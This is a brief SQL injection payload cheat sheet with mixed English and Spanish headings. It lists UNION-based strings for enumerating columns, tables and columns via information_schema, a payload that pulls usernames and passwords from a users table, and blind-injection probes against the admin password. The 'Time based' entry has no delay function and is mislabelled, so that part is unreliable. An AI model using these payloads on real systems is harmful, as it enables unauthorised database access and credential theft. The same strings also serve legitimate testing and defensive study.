Column number enumeration - Finding number of columns in original query, incrementing until error 
      ' ORDER BY 1--

    ## Alternative column enumeration, increment until error
      ' UNION SELECT NULL--
    
    ## Listar todas las tablas
      ' UNION SELECT table_name,NULL FROM information_schema.tables--

    ## Listar todas las columnas
      ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--

    ## Data extraction after finding column count
      ' UNION SELECT username,password FROM users--


  # Blind SQLi

    ## Boolean based
        ' AND (SELECT 'x' FROM users WHERE username='admin' AND LENGTH(password)>5)='x'--

    ## Time based
        ' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--
